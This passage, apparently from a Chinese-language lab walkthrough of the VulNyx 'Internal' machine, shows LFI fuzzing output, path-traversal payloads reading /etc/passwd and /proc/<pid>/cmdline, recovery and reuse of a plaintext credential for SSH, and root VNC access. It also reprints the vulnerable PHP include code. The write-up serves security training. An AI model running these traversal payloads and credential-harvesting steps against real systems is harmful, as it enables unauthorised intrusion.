class="string">&quot;/etc/protocols&quot;</span>  </span><br><span class="line">000000061:   200        28 L     40 W       1404 Ch     <span class="string">&quot;/etc/passwd&quot;</span> </span><br><span class="line">000000060:   200        6 L      8 W        73 Ch       <span class="string">&quot;/etc/networks&quot;</span> </span><br><span class="line">000000059:   200        17 L     54 W       373 Ch      <span class="string">&quot;/etc/network/interfaces&quot;</span>  </span><br><span class="line">000000052:   200        22 L     80 W       777 Ch      <span class="string">&quot;/etc/issue&quot;</span>     </span><br><span class="line">000000051:   200        69 L     259 W      1761 Ch     <span class="string">&quot;/etc/inputrc&quot;</span>     </span><br><span class="line">000000145:   200        3 L      6 W        110 Ch      <span class="string">&quot;/proc/cmdline&quot;</span>   </span><br><span class="line">000000152:   200        6 L      65 W       613 Ch      <span class="string">&quot;/proc/net/tcp&quot;</span>  </span><br><span class="line">000000153:   200        5 L      43 W       397 Ch      <span class="string">&quot;/proc/net/udp&quot;</span>  </span><br><span class="line">000000149:   200        6 L      56 W       459 Ch      <span class="string">&quot;/proc/net/dev&quot;</span>  </span><br><span class="line">000000150:   200        46 L     136 W      1226 Ch     <span class="string">&quot;/proc/net/fib_trie&quot;</span>   </span><br><span class="line">000000148:   200        5 L      23 W       248 Ch      <span class="string">&quot;/proc/net/arp&quot;</span>    </span><br><span class="line">000000151:   200        5 L      35 W       397 Ch      <span class="string">&quot;/proc/net/route&quot;</span>  </span><br><span class="line">000000147:   200        24 L     134 W      1564 Ch     <span class="string">&quot;/proc/mounts&quot;</span>   </span><br><span class="line">000000155:   200        279 L    2720 W     26885 Ch    <span class="string">&quot;/proc/sched_debug&quot;</span> </span><br><span class="line">000000156:   200        2 L      2 W        40 Ch       <span class="string">&quot;/proc/self/cmdline&quot;</span>  </span><br><span class="line">000000199:   200        3 L      23 W       198 Ch      <span class="string">&quot;/proc/version&quot;</span>     </span><br><span class="line">000000196:   200        3 L      54 W       326 Ch      <span class="string">&quot;/proc/self/stat&quot;</span>  </span><br><span class="line">000000197:   200        58 L     138 W      1343 Ch     <span class="string">&quot;/proc/self/status&quot;</span>  </span><br><span class="line">000000201:   200        5 L      20 W       175 Ch      <span class="string">&quot;/proc/net/if_inet6&quot;</span>   </span><br><span class="line">000000285:   200        2 L      4 W        1549 Ch     <span class="string">&quot;/var/run/utmp&quot;</span>    </span><br><span class="line">000000369:   200        140 L    861 W      4955 Ch     <span class="string">&quot;/etc/wgetrc&quot;</span>    </span><br><span class="line">000000368:   200        24 L     134 W      1564 Ch     <span class="string">&quot;/etc/mtab&quot;</span></span><br><span class="line">………………</span><br></pre></td></tr></table></figure>
+<p>注，字典可用：SecLists/Discovery/Web-Content/LinuxFileList.txt</p>
+<p>LFI 利用不了 apache 和 ssh 日志</p>
+<p>尝试 IPv6 入手，利用 LFI 获取 IPv6 地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sX GET <span class="string">&#x27;http://192.168.159.193/internal-item.php?item=....//....//....//proc/net/if_inet6&#x27;</span></span><br><span class="line">curl -sX GET <span class="string">&#x27;http://192.168.159.193/internal-item.php?item=....//....//....//proc/net/if_inet6&#x27;</span> | awk <span class="string">&#x27;NR==4 &#123;print $1&#125;&#x27;</span> | <span class="built_in">fold</span> -w4 | <span class="built_in">paste</span> -sd <span class="string">&#x27;:&#x27;</span></span><br><span class="line">nmap -sS -sV -6 fd15:4ba5:5a2b:1008:020c:29ff:fe59:03fc -p-</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121204032.png" /></p>
+<p>nmap 没扫到有价值的信息，LFI 利用没思路了，暂存……</p>
+<p>9999 端口根据 Server: SimpleHTTP/0.6 Python/3.9.2 推测应该是靶机利用
+Python 开了个 HTTP服务，访问需要登录，基于 Basic 认证，Burpsuite
+抓包尝试爆破</p>
+<blockquote>
+<p><a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/yyxianren/p/15701016.html">Burpsuite密码爆破(Basic认证)
+- 御用闲人 - 博客园</a></p>
+</blockquote>
+<p>没找到弱口令</p>
+<p>推测可能是利用 LFI 获取认证信息，再利用 9999 获取 shell，不过 LFI
+咋利用没思路</p>
+<p>找 write up <span class="math inline">\(\Rightarrow\)</span> LFI 读取
+SimpleHTTP/0.6 进程启动的命令来获取认证信息</p>
+<blockquote>
+<ul>
+<li><code>/proc</code> :
+文件系统是一种虚拟文件系统,以文件系统目录和文件形式,提供一个指向内核数据结构的接口，通过它能够查看和改变各种系统属性<br />
+</li>
+<li><code>/proc/pid</code> :
+每一个<code>/proc/pid</code>目录中还存在一系列目录和文件，这些文件和目录记录的都是关于pid对应进程的信息．例如，在<code>/proc/pid</code>的目录下存在一个task目录，在task目录下又存在<code>task/tid</code>这样的目录，这个目录就是包含此进程中的每个线程的信息，其中的tid是内核线程的tid;通过　GETDENTS(2)　遍历/proc就能够看到所有的<code>/proc/pid</code>的目录，当然通过 <code>ls -al /proc</code>的方式也可以看到所有的信息<br />
+</li>
+<li><code>/proc/[pid]/cmdline</code>
+是一个只读文件，包含用于启动进程的命令行参数。如果这个进程是<code>zombie</code>进程，则这个文件没有任何内容。举例如下：</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ps -ef | grep 2948</span></span><br><span class="line">root       2948      1  0 Nov05 ?        00:00:04 /usr/sbin/libvirtd --listen</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /proc/2948/cmdline</span></span><br><span class="line">/usr/sbin/libvirtd--listen</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>更多信息参见:<br />
+<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man5/proc.5.html">proc(5) -
+Linux manual page</a><br />
+<a target="_blank" rel="noopener" href="https://blog.spoock.com/2019/10/08/proc/">Linux下/proc目录简介
+| Spoock</a></p>
+</blockquote>
+<p>所以如果知道 9999 端口服务的 PID，则可利用 LFI 来获取该进程信息</p>
+<p>由于该服务是利用 python 启动的，而前面 Fuzzing Linux 文件得可读取
+/proc/sched_debug【存进程调度相关信息，详情参见：<a
+target="_blank" rel="noopener" href="https://carlyleliu.github.io/2021/LinuxKernel/Linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%EF%BC%88%E4%BA%94%EF%BC%89%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%9A%84%E8%B0%83%E8%AF%95/">Linux进程管理（五）进程调度的调试
+| Matrix</a>】</p>
+<p>结合这两点可读取 /proc/sched_debug 来推测 9999 端口 HTTP 所对应的
+PID</p>
+<p>实际读取发现只有一个 python 进程，则 492 即为 9999 端口 HTTP 对应的
+PID</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121610213.png" /></p>
+<p>LFI 读取进程启动命令 <code>/proc/492/cmdline</code></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121619606.png" /></p>
+<p>得</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3/home/admin/python3HTTPSAuthServer.py--port9999--authadmin:4dM1Nt3rN4LP4zZ</span><br></pre></td></tr></table></figure>
+<p>注，PID 亦可爆破，参见：<a
+target="_blank" rel="noopener" href="https://infayer.com/archivos/1971">Máquina Internal de VulNyx –
+INFAYER</a></p>
+<p>以 admin:4dM1Nt3rN4LP4zZ 登录 9999 后并未获得任何信息，由于前面 LFI
+已得系统也存在 admin 用户，经测 admin:4dM1Nt3rN4LP4zZ 可直接登录 SSH</p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="ssh-登录">2.1. SSH 登录</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh admin@192.168.159.193</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121632882.png" /></p>
+<h3 id="提权">2.2. 提权</h3>
+<p><code>...</code> 下找到个压缩包，解压密码也是 4dM1Nt3rN4LP4zZ</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121718959.png" /></p>
+<p>没明白怎么用……</p>
+<p>上传 pspy64 执行得靶机有以 root 运行 VNC 服务器，且监听在本地的 5901
+端口【<a
+target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-vnc">5800,5801,5900,5901
+- Pentesting VNC | Chinese - Ht | HackTricks</a>】</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121726650.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/Xtigervnc :1 -rfbport 5901 -localhost=1 -SecurityTypes VncAuth -PasswordFile /root/.vnc/passwd -ClientWaitTimeMillis 30000 -geometry 1920x1200 -desktop internal:1 (root) -depth 24 -auth /root/.Xauthority</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>/usr/bin/Xtigervnc</code>：指定要执行的程序路径，这是Xtigervnc服务器的可执行文件路径。</li>
+<li><code>:1</code>：指定VNC服务器的显示编号，这里是1号显示（通常VNC服务器会监听在5900
++ 显示编号的端口上，即5901）。</li>
+<li><code>-rfbport 5901</code>：指定VNC服务器监听的端口号，这里设置为5901。</li>
+<li><code>-localhost=1</code>：限制VNC服务器只接受本地连接。</li>
+<li><code>-SecurityTypes VncAuth</code>：指定VNC服务器的安全验证类型为VncAuth，即使用VNC密码进行认证。</li>
+<li><code>-PasswordFile /root/.vnc/passwd</code>：指定存储VNC密码的文件路径，这里设置为<code>/root/.vnc/passwd</code>。</li>
+<li><code>-ClientWaitTimeMillis 30000</code>：指定客户端等待连接的时间，单位为毫秒，这里设置为30000毫秒（30秒）。</li>
+<li><code>-geometry 1920x1200</code>：指定VNC会话的分辨率，这里设置为1920x1200。</li>
+<li><code>-desktop internal:1 (root)</code>：指定VNC会话的桌面名称，这里设置为<code>internal:1</code>，并指定了使用root用户启动。</li>
+<li><code>-depth 24</code>：指定VNC会话的颜色深度为24位。</li>
+<li><code>-auth /root/.Xauthority</code>：指定X服务器的认证文件路径，这里设置为<code>/root/.Xauthority</code>，用于认证X服务器对VNC会话的访问权限。</li>
+</ul>
+<p>查下端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin@internal:~$ ss -tuln</span><br><span class="line">Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                   </span><br><span class="line">udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                                </span><br><span class="line">tcp                     LISTEN                   0                        5                                              127.0.0.1:5901                                            0.0.0.0:*                                                </span><br><span class="line">tcp                     LISTEN                   0                        5                                                0.0.0.0:9999                                            0.0.0.0:*                                                </span><br><span class="line">tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                                </span><br><span class="line">tcp                     LISTEN                   0                        5                                                  [::1]:5901                                               [::]:*                                                </span><br><span class="line">tcp                     LISTEN                   0                        511                                                    *:80                                                    *:*                                                </span><br><span class="line">tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                  </span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>-t</code>：仅显示TCP套接字。</li>
+<li><code>-u</code>：仅显示UDP套接字。</li>
+<li><code>-l</code>：仅显示处于监听状态的套接字。</li>
+<li><code>-n</code>：不解析服务名，直接显示端口号</li>
+</ul>
+<p>前面解压所得 passwd 应该就是 VNC 的密码</p>
+<p>靶机利用 vncviewer 尝试连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncviewer -passwd passwd 127.0.0.1::5901</span><br></pre></td></tr></table></figure>
+<p>注，SSH 登录时要开启 X11 转发【<a
+target="_blank" rel="noopener" href="https://cn.linux-terminal.com/?p=4775">如何在 Linux 中使用 SSH
+配置 X11 转发</a>】</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh admin@192.168.159.193 -X</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121745622.png" /></p>
+<p>成功连接！</p>
+<h2 id="复盘">3. 复盘</h2>
+<h3 id="lfi">3.1. 80 - LFI</h3>
+<p>internal-item.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>([<span class="string">&quot;../&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;.log&quot;</span>, <span class="string">&quot;home&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;root.txt&quot;</span>, <span class="string">&quot;user.txt&quot;</span>, <span class="string">&quot;conf&quot;</span>, <span class="string">&quot;.conf&quot;</span>, ], <span class="string">&quot;&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;item&quot;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;/var/www/html/<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="simplehttp0.6">3.2. 9999 - SimpleHTTP/0.6</h3>
+<p>admin 定时任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">admin@internal:~$ crontab -l</span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Each task to run has to be defined through a single line</span></span><br><span class="line"><span class="comment"># indicating with different fields when the task will be run</span></span><br><span class="line"><span class="comment"># and what command to run for the task</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># To define the time you can provide concrete values for</span></span><br><span class="line"><span class="comment"># minute (m), hour (h), day of month (dom), month (mon),</span></span><br><span class="line"><span class="comment"># and day of week (dow) or use &#x27;*&#x27; in these fields (for &#x27;any&#x27;).</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Notice that tasks will be started based on the cron&#x27;s system</span></span><br><span class="line"><span class="comment"># daemon&#x27;s notion of time and timezones.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># Output of the crontab jobs (including errors) is sent through</span></span><br><span class="line"><span class="comment"># email to the user the crontab file belongs to (unless redirected).</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"><span class="comment"># at 5 a.m every week with:</span></span><br><span class="line"><span class="comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">@reboot <span class="built_in">cd</span> /opt &amp;&amp; /home/admin/python3HTTPSAuthServer.py --port 9999 --auth <span class="string">&#x27;admin:4dM1Nt3rN4LP4zZ&#x27;</span> &amp;</span><br></pre></td></tr></table></figure>
+<p>python3HTTPSAuthServer.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, SimpleHTTPRequestHandler  <span class="comment"># 导入HTTP服务器和请求处理模块</span></span><br><span class="line"><span class="keyword">import</span> ssl, os, sys, argparse, base64  <span class="comment"># 导入SSL、系统、命令行参数解析和Base64模块</span></span><br><span class="line"></span><br><span class="line">NARGS = <span class="built_in">len</span>(sys.argv)  <span class="comment"># 记录命令行参数的数量</span></span><br><span class="line">ARGS = &#123;&#125;  <span class="comment"># 创建一个空字典用于存储解析后的命令行参数</span></span><br><span class="line">tempfiles = []  <span class="comment"># 创建一个空列表用于存储临时文件的路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Args</span>():  <span class="comment"># 定义函数，用于解析命令行参数</span></span><br><span class="line">    AO = argparse.ArgumentParser(description=<span class="string">&quot;Python HTTPS Auth Server&quot;</span>)  <span class="comment"># 创建参数解析器</span></span><br><span class="line">    AO.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--ip&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Bind IP (Default all interfaces 0.0.0.0)&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;0.0.0.0&quot;</span>)  <span class="comment"># 添加IP绑定参数</span></span><br><span class="line">    AO.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--port&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Bind port, default 8443&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">8443</span>)  <span class="comment"># 添加端口绑定参数</span></span><br><span class="line">    AO.add_argument(<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;--auth&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;HTTP BASIC auth  [username:password]&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>)  <span class="comment"># 添加HTTP基本认证参数</span></span><br><span class="line">    AO.add_argument(<span class="string">&quot;-s&quot;</span>, <span class="string">&quot;--https&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Use HTTPS&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)  <span class="comment"># 添加HTTPS使用参数</span></span><br><span class="line">    AO.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cert&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;If you brought your own CERT, then by all means... [fullpath]&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>)  <span class="comment"># 添加自定义证书路径参数</span></span><br><span class="line">    AO.add_argument(<span class="string">&quot;-k&quot;</span>, <span class="string">&quot;--privatekey&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;If you brought your own PRIVATE_KEY, then by all means... [fullpath]&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>)  <span class="comment"># 添加自定义私钥路径参数</span></span><br><span class="line">    AP, AP_garbage = AO.parse_known_args()  <span class="comment"># 解析命令行参数</span></span><br><span class="line">    ARGS = <span class="built_in">vars</span>(AP)  <span class="comment"># 将解析后的参数存储在字典中</span></span><br><span class="line">    <span class="keyword">if</span> (ARGS[<span class="string">&#x27;cert&#x27;</span>] <span class="keyword">and</span> <span class="keyword">not</span> ARGS[<span class="string">&#x27;privatekey&#x27;</span>]) <span class="keyword">or</span> (ARGS[<span class="string">&#x27;privatekey&#x27;</span>] <span class="keyword">and</span> <span class="keyword">not</span> ARGS[<span class="string">&#x27;cert&#x27;</span>]):  <span class="comment"># 检查是否同时提供了证书和私钥</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] You can BYOC only when providing BOTH a certfile and matching private key! Else NEITHER, and generate a self-signed automatically&quot;</span>)  <span class="comment"># 打印错误信息</span></span><br><span class="line">        sys.exit()  <span class="comment"># 退出程序</span></span><br><span class="line">    <span class="keyword">return</span> ARGS  <span class="comment"># 返回解析后的参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gencert</span>():  <span class="comment"># 定义生成证书的函数</span></span><br><span class="line">    <span class="keyword">from</span> OpenSSL <span class="keyword">import</span> crypto, SSL  <span class="comment"># 导入OpenSSL模块</span></span><br><span class="line">    <span class="keyword">from</span> pprint <span class="keyword">import</span> pprint  <span class="comment"># 导入pprint模块</span></span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> gmtime, mktime  <span class="comment"># 导入时间模块</span></span><br><span class="line">    <span class="keyword">from</span> os.path <span class="keyword">import</span> exists, join  <span class="comment"># 导入路径模块</span></span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> choice, randint  <span class="comment"># 导入随机模块</span></span><br><span class="line">    <span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters  <span class="comment"># 导入字符串模块</span></span><br><span class="line">    <span class="keyword">import</span> tempfile, pathlib, os.path  <span class="comment"># 导入临时文件和路径模块</span></span><br><span class="line">    CN = <span class="string">&quot;SSLS&quot;</span>  <span class="comment"># 设置通用名称</span></span><br><span class="line">    k = crypto.PKey()  <span class="comment"># 创建密钥对象</span></span><br><span class="line">    k.generate_key(crypto.TYPE_RSA, <span class="number">4096</span>)  <span class="comment"># 生成RSA密钥</span></span><br><span class="line">    cert = crypto.X509()  <span class="comment"># 创建X.509证书对象</span></span><br><span class="line">    cert.get_subject().C = <span class="string">&quot;&quot;</span>.join([choice(ascii_letters[:<span class="number">26</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)])  <span class="comment"># 设置证书国家代码</span></span><br><span class="line">    cert.get_subject().ST = <span class="string">&quot;&quot;</span>.join([choice(ascii_letters[:<span class="number">26</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)])  <span class="comment"># 设置证书省份</span></span><br><span class="line">    cert.get_subject().L = <span class="string">&quot;&quot;</span>.join([choice(ascii_letters[:<span class="number">26</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, randint(<span class="number">2</span>,<span class="number">32</span>))])  <span class="comment"># 设置证书城市</span></span><br><span class="line">    cert.get_subject().O = <span class="string">&quot;&quot;</span>.join([choice(ascii_letters[:<span class="number">26</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, randint(<span class="number">2</span>,<span class="number">32</span>))])  <span class="comment"># 设置证书组织</span></span><br><span class="line">    cert.get_subject().OU = <span class="string">&quot;&quot;</span>.join([choice(ascii_letters[:<span class="number">26</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, randint(<span class="number">2</span>,<span class="number">32</span>))])  <span class="comment"># 设置证书单位</span></span><br><span class="line">    cert.get_subject().CN = CN  <span class="comment"># 设置证书通用名称</span></span><br><span class="line">    cert.set_serial_number(randint(<span class="number">1000</span>,<span class="number">9999</span>))  <span class="comment"># 设置证书序列号</span></span><br><span class="line">    cert.gmtime_adj_notBefore(<span class="number">0</span>)  <span class="comment"># 设置证书生效时间</span></span><br><span class="line">    cert.gmtime_adj_notAfter(<span class="number">604800</span>)  <span class="comment"># 设置证书失效时间</span></span><br><span class="line">    cert.set_issuer(cert.get_subject())  <span class="comment"># 设置证书颁发者</span></span><br><span class="line">    cert.set_pubkey(k)  <span class="comment"># 设置证书公钥</span></span><br><span class="line">    cert.sign(k, <span class="string">&#x27;sha256&#x27;</span>)  <span class="comment"># 对证书进行签名</span></span><br><span class="line">    CERT_FILE = <span class="string">&quot;%s.crt&quot;</span> % CN  <span class="comment"># 设置证书文件名</span></span><br><span class="line">    PEM_FILE = <span class="string">&quot;%s.pem&quot;</span> % CN  <span class="comment"># 设置私钥文件名</span></span><br><span class="line">    PUBKEY_FILE = <span class="string">&quot;%s.pub&quot;</span> % CN  <span class="comment"># 设置公钥文件名</span></span><br><span class="line">    dirpath = tempfile.gettempdir()  <span class="comment"># 获取临时目录路径</span></span><br><span class="line">    cert_dir = dirpath + os.path.sep  <span class="comment"># 设置证书目录路径</span></span><br><span class="line">    C_F = join(cert_dir, CERT_FILE)  <span class="comment"># 设置证书文件路径</span></span><br><span class="line">    K_F = join(cert_dir, PEM_FILE)  <span class="comment"># 设置私钥文件路径</span></span><br><span class="line">    P_F = join(cert_dir, PUBKEY_FILE)  <span class="comment"># 设置公钥文件路径</span></span><br><span class="line">    <span class="keyword">global</span> tempfiles  <span class="comment"># 声明全局变量</span></span><br><span class="line">    tempfiles.append(C_F)  <span class="comment"># 添加证书文件路径到临时文件列表</span></span><br><span class="line">    tempfiles.append(K_F)  <span class="comment"># 添加私钥文件路径到临时文件列表</span></span><br><span class="line">    tempfiles.append(P_F)  <span class="comment"># 添加公钥文件路径到临时文件列表</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[#] Generating disposible, one-time-use, self-signed cert files in:  %s&quot;</span> % cert_dir)  <span class="comment"># 打印信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[.]%s\n[.]%s\n[.]%s&quot;</span> % (C_F, K_F, P_F))  <span class="comment"># 打印证书、私钥和公钥文件的路径</span></span><br><span class="line">    <span class="built_in">open</span>(C_F, <span class="string">&#x27;wt&#x27;</span>).write((crypto.dump_certificate(crypto.FILETYPE_PEM, cert)).decode(<span class="string">&quot;utf-8&quot;</span>))  <span class="comment"># 写入证书文件</span></span><br><span class="line">    <span 